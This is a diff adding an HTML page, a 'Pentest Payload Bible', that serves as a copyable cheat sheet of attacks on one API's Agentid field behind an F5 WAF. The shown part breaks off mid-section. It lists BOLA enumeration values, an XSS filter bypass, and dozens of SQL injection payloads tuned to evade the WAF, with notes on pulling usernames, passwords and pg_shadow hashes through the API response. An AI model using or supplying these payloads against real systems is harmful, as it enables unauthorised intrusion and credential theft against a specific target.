@@ -1,0 +1,1070 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PENTEST PAYLOAD BIBLE v3</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@300;400;600;700&family=Barlow:wght@400;600;700;900&display=swap');
+
+:root {
+  --bg:#04080c;
+  --s1:#080e14;
+  --s2:#0d1520;
+  --s3:#121d2a;
+  --b1:#1a2a3a;
+  --b2:#22364a;
+  --green:#00ff88;
+  --cyan:#00ccff;
+  --red:#ff3355;
+  --orange:#ff9900;
+  --yellow:#ffdd44;
+  --purple:#bb88ff;
+  --pink:#ff66aa;
+  --dim:#304050;
+  --mid:#5a7a90;
+  --text:#8aaabb;
+  --bright:#c8dde8;
+  --white:#e8f4ff;
+}
+
+*{box-sizing:border-box;margin:0;padding:0;}
+html{scroll-behavior:smooth;}
+body{background:var(--bg);color:var(--text);font-family:'IBM Plex Mono',monospace;font-size:12px;line-height:1.6;}
+
+/* ═══ HEADER ═══ */
+.hdr{
+  background:linear-gradient(135deg,#050d16 0%,#080f18 100%);
+  border-bottom:1px solid var(--b1);
+  padding:20px 24px 16px;
+  position:sticky;top:0;z-index:200;
+}
+.hdr-top{display:flex;align-items:center;gap:16px;flex-wrap:wrap;}
+.logo{
+  font-family:'Barlow',sans-serif;font-weight:900;font-size:22px;
+  color:var(--green);letter-spacing:2px;text-shadow:0 0 20px rgba(0,255,136,.25);
+}
+.hdr-badges{display:flex;gap:8px;flex-wrap:wrap;margin-top:8px;}
+.hdr-badge{
+  font-size:9px;font-family:'Barlow',sans-serif;font-weight:700;letter-spacing:1px;
+  padding:2px 8px;border-radius:2px;
+}
+.hb-green{background:rgba(0,255,136,.1);color:var(--green);border:1px solid rgba(0,255,136,.25);}
+.hb-red{background:rgba(255,51,85,.1);color:var(--red);border:1px solid rgba(255,51,85,.25);}
+.hb-orange{background:rgba(255,153,0,.1);color:var(--orange);border:1px solid rgba(255,153,0,.25);}
+.hb-cyan{background:rgba(0,204,255,.1);color:var(--cyan);border:1px solid rgba(0,204,255,.25);}
+
+.waf-oracle{
+  background:linear-gradient(90deg,rgba(255,51,85,.08),rgba(255,153,0,.05));
+  border:1px solid rgba(255,153,0,.2);
+  border-left:3px solid var(--orange);
+  padding:10px 14px;
+  margin-top:10px;
+  border-radius:2px;
+  font-size:11px;
+}
+.waf-oracle b{color:var(--orange);}
+.waf-oracle .blocked{color:var(--red);}
+.waf-oracle .pass{color:var(--green);}
+
+/* ═══ LAYOUT ═══ */
+.layout{display:grid;grid-template-columns:200px 1fr;min-height:calc(100vh - 120px);}
+
+/* ═══ SIDEBAR ═══ */
+.sidebar{
+  background:var(--s1);border-right:1px solid var(--b1);
+  padding:12px 0;
+  position:sticky;top:120px;
+  height:calc(100vh - 120px);
+  overflow-y:auto;
+}
+.sidebar::-webkit-scrollbar{width:2px;}
+.sidebar::-webkit-scrollbar-thumb{background:var(--b2);}
+.slabel{font-size:9px;font-family:'Barlow',sans-serif;font-weight:700;letter-spacing:2px;color:var(--dim);padding:12px 14px 4px;text-transform:uppercase;}
+.sidebar a{
+  display:flex;align-items:center;gap:8px;
+  padding:5px 14px;color:var(--mid);text-decoration:none;font-size:10px;
+  border-left:2px solid transparent;transition:all .1s;
+}
+.sidebar a:hover{color:var(--bright);border-left-color:var(--cyan);background:rgba(0,204,255,.04);}
+.dot{width:5px;height:5px;border-radius:50%;flex-shrink:0;}
+.cnt{margin-left:auto;font-size:9px;color:var(--dim);background:var(--s2);padding:1px 4px;border-radius:2px;}
+
+/* ═══ MAIN ═══ */
+.main{padding:0;}
+
+/* ═══ SECTION ═══ */
+.section{border-bottom:1px solid var(--b1);padding:20px 22px;}
+.sec-head{display:flex;align-items:center;gap:10px;margin-bottom:14px;padding-bottom:8px;border-bottom:1px solid var(--b1);}
+.sec-num{
+  font-family:'Barlow',sans-serif;font-size:10px;font-weight:700;
+  background:var(--s3);border:1px solid var(--b1);color:var(--dim);
+  padding:2px 6px;border-radius:2px;letter-spacing:1px;
+}
+.sec-title{font-family:'Barlow',sans-serif;font-weight:700;font-size:16px;letter-spacing:.5px;}
+.pill{font-size:9px;font-family:'Barlow',sans-serif;font-weight:700;letter-spacing:1px;padding:2px 7px;border-radius:2px;}
+.p-red{background:rgba(255,51,85,.15);color:var(--red);border:1px solid rgba(255,51,85,.3);}
+.p-green{background:rgba(0,255,136,.08);color:var(--green);border:1px solid rgba(0,255,136,.2);}
+.p-orange{background:rgba(255,153,0,.1);color:var(--orange);border:1px solid rgba(255,153,0,.25);}
+.p-purple{background:rgba(187,136,255,.1);color:var(--purple);border:1px solid rgba(187,136,255,.25);}
+
+/* ═══ PAYLOAD CARD ═══ */
+.pcard{
+  background:var(--s2);border:1px solid var(--b1);
+  border-radius:3px;margin-bottom:8px;overflow:hidden;
+}
+.pcard-head{
+  display:grid;grid-template-columns:1fr auto auto;
+  align-items:start;gap:10px;padding:10px 12px;
+  cursor:pointer;
+}
+.pcard-head:hover{background:rgba(255,255,255,.02);}
+.pcard-title{font-family:'Barlow',sans-serif;font-weight:600;font-size:13px;color:var(--bright);letter-spacing:.3px;}
+.pcard-sub{font-size:10px;color:var(--mid);margin-top:2px;font-weight:300;}
+.sev{font-size:9px;font-family:'Barlow',sans-serif;font-weight:700;letter-spacing:1px;padding:2px 6px;border-radius:2px;white-space:nowrap;margin-top:2px;}
+.s-crit{background:rgba(255,51,85,.2);color:#ff3355;border:1px solid rgba(255,51,85,.4);}
+.s-high{background:rgba(255,153,0,.15);color:#ff9900;border:1px solid rgba(255,153,0,.35);}
+.s-med{background:rgba(255,221,68,.08);color:#ffdd44;border:1px solid rgba(255,221,68,.25);}
+.chev{color:var(--dim);font-size:12px;margin-top:3px;transition:transform .15s;}
+.pcard.open .chev{transform:rotate(90deg);}
+
+.pcard-body{
+  border-top:1px solid var(--b1);
+  display:none;
+  background:var(--s1);
+}
+.pcard.open .pcard-body{display:block;}
+
+/* ═══ NOTE BOX ═══ */
+.note{
+  background:rgba(0,204,255,.04);border-left:2px solid rgba(0,204,255,.3);
+  padding:8px 12px;font-size:10px;color:var(--mid);margin:10px 12px 0;border-radius:0 2px 2px 0;
+}
+.note b{color:var(--cyan);}
+.note .warn{color:var(--orange);}
+.note .ok{color:var(--green);}
+
+/* ═══ PAYLOAD ROWS ═══ */
+.payload-list{padding:10px 12px;}
+
+.prow{
+  display:grid;
+  grid-template-columns:1fr auto;
+  align-items:stretch;
+  border:1px solid var(--b1);
+  border-radius:2px;
+  margin-bottom:5px;
+  overflow:hidden;
+  background:#040810;
+}
+.prow:hover{border-color:var(--b2);}
+
+.prow-code{
+  padding:7px 10px;
+  font-family:'IBM Plex Mono',monospace;
+  font-size:11px;
+  color:#c8a86a;
+  white-space:pre;
+  overflow-x:auto;
+  border-right:1px solid var(--b1);
+  line-height:1.5;
+}
+.prow-code .c{color:var(--dim);}       /* comment */
+.prow-code .k{color:var(--cyan);}      /* key */
+.prow-code .v{color:#c8a86a;}          /* value */
+.prow-code .inj{color:#ff8855;}        /* injection */
+.prow-code .bypass{color:var(--green);} /* bypass marker */
+.prow-code .head{color:var(--yellow);} /* http header */
+
+.prow-btn{
+  display:flex;align-items:center;justify-content:center;
+  padding:0 12px;
+  background:var(--s2);
+  color:var(--dim);
+  font-family:'IBM Plex Mono',monospace;
+  font-size:9px;
+  font-weight:600;
+  cursor:pointer;
+  border:none;
+  letter-spacing:1px;
+  min-width:52px;
+  transition:all .12s;
+  white-space:nowrap;
+}
+.prow-btn:hover{background:rgba(0,255,136,.1);color:var(--green);}
+.prow-btn.copied{background:rgba(0,255,136,.15);color:var(--green);}
+
+/* ═══ GROUP LABEL ═══ */
+.grp{
+  font-size:9px;font-family:'Barlow',sans-serif;font-weight:700;letter-spacing:2px;
+  color:var(--dim);text-transform:uppercase;
+  padding:8px 12px 4px;margin-top:4px;
+}
+
+/* ═══ FOOTER ═══ */
+.footer{padding:16px 22px;border-top:1px solid var(--b1);font-size:10px;color:var(--dim);}
+.footer span{color:var(--green);}
+
+@media(max-width:800px){
+  .layout{grid-template-columns:1fr;}
+  .sidebar{display:none;}
+  body{font-size:11px;}
+}
+</style>
+</head>
+<body>
+
+<div class="hdr">
+  <div class="hdr-top">
+    <div class="logo">⬡ PAYLOAD BIBLE v3</div>
+    <div style="font-size:10px;color:var(--mid);">Agent Pair Endpoints · F5 Advanced WAF · HTTP/1.1 · JWT + KID</div>
+  </div>
+  <div class="hdr-badges">
+    <span class="hdr-badge hb-green">AGENTID: 2+ chars, no type validation</span>
+    <span class="hdr-badge hb-red">ID: 11-digit constraint → focus on Agentid</span>
+    <span class="hdr-badge hb-orange">JWT with KID parameter present</span>
+    <span class="hdr-badge hb-cyan">HTTP/1.1 · smuggling viable</span>
+  </div>
+  <div class="waf-oracle">
+    <b>⚑ F5 WAF ORACLE:</b> &nbsp;
+    <span class="blocked">✗ BLOCKED → <code>'>&lt;img/src/onerror=alert(1)&gt;</code></span>
+    &nbsp;&nbsp;
+    <span class="pass">✓ PASSES → <code>'>&lt;img/src/onerror=prompt(1)&gt;</code></span>
+    &nbsp;→ F5 signature targets <code>alert</code> keyword specifically. Use <b>prompt / confirm / print / console.log</b> as proof-of-concept. Same logic applies to SQL: avoid blocked keywords raw, use obfuscation chains below.
+  </div>
+</div>
+
+<div class="layout">
+
+<!-- SIDEBAR -->
+<nav class="sidebar">
+  <div class="slabel">Core</div>
+  <a href="#s1"><span class="dot" style="background:#ff3355"></span>BOLA / IDOR<span class="cnt">12</span></a>
+  <a href="#s2"><span class="dot" style="background:#ff9900"></span>SQLi · Agentid<span class="cnt">45</span></a>
+  <a href="#s3"><span class="dot" style="background:#ff9900"></span>NoSQLi · Mongo<span class="cnt">22</span></a>
+  <a href="#s4"><span class="dot" style="background:#ffdd44"></span>Mass Assignment<span class="cnt">18</span></a>
+  <a href="#s5"><span class="dot" style="background:#ffdd44"></span>Type Confusion<span class="cnt">20</span></a>
+  <a href="#s6"><span class="dot" style="background:#bb88ff"></span>SSTI · All Engines<span class="cnt">20</span></a>
+  <a href="#s7"><span class="dot" style="background:#00ccff"></span>SSRF · All Protos<span class="cnt">20</span></a>
+  <div class="slabel">JWT</div>
+  <a href="#s8"><span class="dot" style="background:#ff66aa"></span>JWT · KID Attacks<span class="cnt">50</span></a>
+  <a href="#s9"><span class="dot" style="background:#ff66aa"></span>JWT · Other<span class="cnt">15</span></a>
+  <div class="slabel">F5 Bypass</div>
+  <a href="#s10"><span class="dot" style="background:#ff3355"></span>Encoding Bypass<span class="cnt">30</span></a>
+  <a href="#s11"><span class="dot" style="background:#ff3355"></span>JSON Structure<span class="cnt">20</span></a>
+  <a href="#s12"><span class="dot" style="background:#ff9900"></span>HTTP Protocol<span class="cnt">15</span></a>
+  <div class="slabel">HTTP/1.1</div>
+  <a href="#s13"><span class="dot" style="background:#ff3355"></span>CL.TE Smuggling<span class="cnt">8</span></a>
+  <a href="#s14"><span class="dot" style="background:#ff3355"></span>TE.CL Smuggling<span class="cnt">6</span></a>
+  <a href="#s15"><span class="dot" style="background:#ff9900"></span>TE.TE Obfuscation<span class="cnt">18</span></a>
+  <div class="slabel">Advanced</div>
+  <a href="#s16"><span class="dot" style="background:#00ff88"></span>Deserialization<span class="cnt">12</span></a>
+  <a href="#s17"><span class="dot" style="background:#00ccff"></span>Race Conditions<span class="cnt">6</span></a>
+  <a href="#s18"><span class="dot" style="background:#bb88ff"></span>Recon / Leak<span class="cnt">15</span></a>
+</nav>
+
+<main class="main">
+
+<!-- ══════════════════════════════════════════════ -->
+<!-- S1: BOLA -->
+<!-- ══════════════════════════════════════════════ -->
+<div class="section" id="s1">
+  <div class="sec-head"><span class="sec-num">01</span><span class="sec-title" style="color:var(--red)">BOLA / IDOR — No WAF Bypass Needed</span><span class="pill p-red">HIGHEST VALUE</span></div>
+
+  <div class="pcard">
+    <div class="pcard-head" onclick="tog(this)">
+      <div><div class="pcard-title">EP2 — Agentid Enumeration (Common Names)</div><div class="pcard-sub">view-agent-pair · any Agentid leaks their paired Id</div></div>
+      <span class="sev s-crit">CRITICAL</span><span class="chev">›</span>
+    </div>
+    <div class="pcard-body">
+      <div class="note"><b>Strategy:</b> EP2 returns Id for any Agentid with no ownership check = full BOLA. These payloads need zero WAF bypass — they're valid JSON. Rotate all of them.</div>
+      <div class="payload-list">
+        <div class="grp">Common agent names</div>
+        <div class="prow"><div class="prow-code">{"Agentid": "admin"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "administrator"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "root"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "system"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "superuser"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "sa"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "api"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "bot"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "svc"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "test"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "demo"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "guest"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="grp">Case / whitespace collision (DB collation)</div>
+        <div class="prow"><div class="prow-code">{"Agentid": "ANON"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "Anon"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon "}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": " anon"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon\t"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon\u00a0"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="grp">Unicode homoglyph collision</div>
+        <div class="prow"><div class="prow-code">{"Agentid": "ａｎｏｎ"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "аnon"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "an\u200bon"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "an\ufeffon"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="grp">LIKE wildcard — if backend uses LIKE instead of =</div>
+        <div class="prow"><div class="prow-code">{"Agentid": "%"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "_"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "a%"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "%admin%"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon%"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════════ -->
+<!-- S2: SQLi -->
+<!-- ══════════════════════════════════════════════ -->
+<div class="section" id="s2">
+  <div class="sec-head"><span class="sec-num">02</span><span class="sec-title" style="color:var(--orange)">SQL Injection — Agentid · F5 Bypass Variants</span><span class="pill p-orange">WAF BYPASS REQUIRED</span></div>
+  <div class="note" style="margin-bottom:12px"><b>Oracle:</b> F5 blocks <code>alert</code>, passes <code>prompt</code>. Apply same logic to SQL: F5 blocks raw <code>OR 1=1</code>, <code>UNION SELECT</code>, <code>SLEEP</code>. Use <span class="ok">comment fragmentation + unicode escapes + whitespace variants</span> below. Test each group — different F5 rule sets trigger on different patterns.</div>
+
+  <div class="pcard">
+    <div class="pcard-head" onclick="tog(this)">
+      <div><div class="pcard-title">Boolean SQLi — Comment + Whitespace Bypass Chain</div><div class="pcard-sub">inline comments · unicode whitespace · tab/newline · case mutation</div></div>
+      <span class="sev s-crit">CRITICAL</span><span class="chev">›</span>
+    </div>
+    <div class="pcard-body">
+      <div class="payload-list">
+        <div class="grp">Comment fragmentation</div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon'/**/OR/**/1=1--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon'/**/OR/**/'1'='1"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon'/*!OR*/1=1--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon'/*!50000OR*/1=1--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon'/*x*/OR/*x*/1=1--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon'O/**/R 1=1--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon' O/**/R 1/**/=/**/1--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="grp">Tab / newline whitespace (JSON allows in string values)</div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon'\tOR\t1=1--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon'\nOR\n1=1--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon'\r\nOR\r\n1=1--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon'\u0009OR\u00091=1--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon'\u000bOR\u000b1=1--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon'\u000cOR\u000c1=1--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon'\u00a0OR\u00a01=1--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon'\u2009OR\u20091=1--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon'\u3000OR\u30001=1--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="grp">Unicode escape — F5 inspects bytes before JSON decode</div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon\u0027 OR 1=1--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon\u0027\u0020OR\u00201=1--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon\u0027 \u004f\u0052 1=1--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon\u0027 OR \u0031=\u0031--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon\u0027\u0020\u004f\u0052\u0020\u0031\u003d\u0031\u002d\u002d"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="grp">Case mutation</div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon' oR 1=1--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon' Or 1=1--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon' oR/**/ 1=1--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="grp">Hex / CHAR encoding (value side)</div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon'/**/OR/**/0x31=0x31--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon'/**/OR/**/CHAR(49)=CHAR(49)--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon'/**/OR/**/CONCAT('1','=','1')--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon'/**/OR/**/1e0=1e0--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="pcard">
+    <div class="pcard-head" onclick="tog(this)">
+      <div><div class="pcard-title">Time-Based Blind SQLi — All DB Flavors + F5 Bypass</div><div class="pcard-sub">SLEEP · WAITFOR · pg_sleep · DBMS_PIPE · measure response delta</div></div>
+      <span class="sev s-crit">CRITICAL</span><span class="chev">›</span>
+    </div>
+    <div class="pcard-body">
+      <div class="note"><b>Method:</b> Set baseline latency first. Then send payload with 5s delay. &gt;5s response = injection confirmed. Start with 1s for stealth.</div>
+      <div class="payload-list">
+        <div class="grp">MySQL — comment bypass</div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon'/**/AND/**/SLEEP(5)--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon'/**/AND/**/SLEEP(5)#"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon'/*!AND*//**/SLEEP(5)--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon'/**/AND/**/(SELECT/**/SLEEP(5))--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon'||(SELECT/**/SLEEP(5))--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon'/**/AND/**/(SELECT/**/1/**/FROM/**/(SELECT/**/SLEEP(5))a)--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon'/**/AND/**/SL\u0045EP(5)--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon'/**/AND/**/SLE/**/EP(5)--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="grp">MSSQL</div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon';WAITFOR/**/DELAY/**/'0:0:5'--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon'/**/AND/**/1=1;WAITFOR/**/DELAY/**/'0:0:5'--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon';WAI\u0054FOR/**/DEL\u0041Y/**/'0:0:5'--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="grp">PostgreSQL</div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon';SELECT/**/pg_sleep(5)--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon'/**/AND/**/(SELECT/**/pg_sleep(5))='1'--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon'||(SELECT/**/CASE/**/WHEN/**/(1=1)/**/THEN/**/pg_sleep(5)/**/ELSE/**/pg_sleep(0)/**/END)--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="grp">Oracle</div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon'/**/AND/**/1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5)--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="pcard">
+    <div class="pcard-head" onclick="tog(this)">
+      <div><div class="pcard-title">UNION-Based SQLi — Data Exfil via EP2 Response</div><div class="pcard-sub">column enum → exfil passwords/tokens in Id response field</div></div>
+      <span class="sev s-crit">CRITICAL</span><span class="chev">›</span>
+    </div>
+    <div class="pcard-body">
+      <div class="note"><b>Key insight:</b> EP2 returns Id from DB. If UNION works, inject arbitrary data into the Id position → it returns in the API response body. Use non-existent Agentid so real row doesn't interfere.</div>
+      <div class="payload-list">
+        <div class="grp">Column count — ORDER BY</div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon'/**/ORDER/**/BY/**/1--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon'/**/ORDER/**/BY/**/2--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon'/**/ORDER/**/BY/**/3--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon'/**/ORDER/**/BY/**/4--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="grp">UNION with NULLs</div>
+        <div class="prow"><div class="prow-code">{"Agentid": "xx'/**/UNION/**/SELECT/**/NULL--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "xx'/**/UNION/**/SELECT/**/NULL,NULL--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "xx'/**/UNION/**/SELECT/**/NULL,NULL,NULL--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="grp">MySQL data extraction</div>
+        <div class="prow"><div class="prow-code">{"Agentid": "xx'/**/UNION/**/SELECT/**/version()--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "xx'/**/UNION/**/SELECT/**/database()--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "xx'/**/UNION/**/SELECT/**/user()--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "xx'/**/UNION/**/SELECT/**/group_concat(table_name)/**/FROM/**/information_schema.tables/**/WHERE/**/table_schema=database()--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "xx'/**/UNION/**/SELECT/**/group_concat(column_name)/**/FROM/**/information_schema.columns/**/WHERE/**/table_name='users'--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "xx'/**/UNION/**/SELECT/**/concat(username,0x3a,password)/**/FROM/**/users/**/LIMIT/**/1--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="grp">MSSQL data extraction</div>
+        <div class="prow"><div class="prow-code">{"Agentid": "xx'/**/UNION/**/SELECT/**/@@version--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "xx'/**/UNION/**/SELECT/**/TOP/**/1/**/name/**/FROM/**/sysobjects/**/WHERE/**/xtype='U'--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="grp">PostgreSQL data extraction</div>
+        <div class="prow"><div class="prow-code">{"Agentid": "xx'/**/UNION/**/SELECT/**/version()--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "xx'/**/UNION/**/SELECT/**/usename||':'||passwd/**/FROM/**/pg_shadow/**/LIMIT/**/1--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="pcard">
+    <div class="pcard-head" onclick="tog(this)">
+      <div><div class="pcard-title">Second-Order SQLi — Store via EP1, Trigger via EP2</div><div class="pcard-sub">sanitized on write → raw in read query → injection fires</div></div>
+      <span class="sev s-crit">CRITICAL</span><span class="chev">›</span>
+    </div>
+    <div class="pcard-body">
+      <div class="note"><b>Pattern:</b> EP1 may sanitize input on write (parameterized). But EP2 fetches the stored Agentid and uses it in a second query unsanitized. Store payload via EP1, trigger via EP2 with same Agentid.</div>
+      <div class="payload-list">
+        <div class="grp">Store these via EP1 → then query via EP2</div>
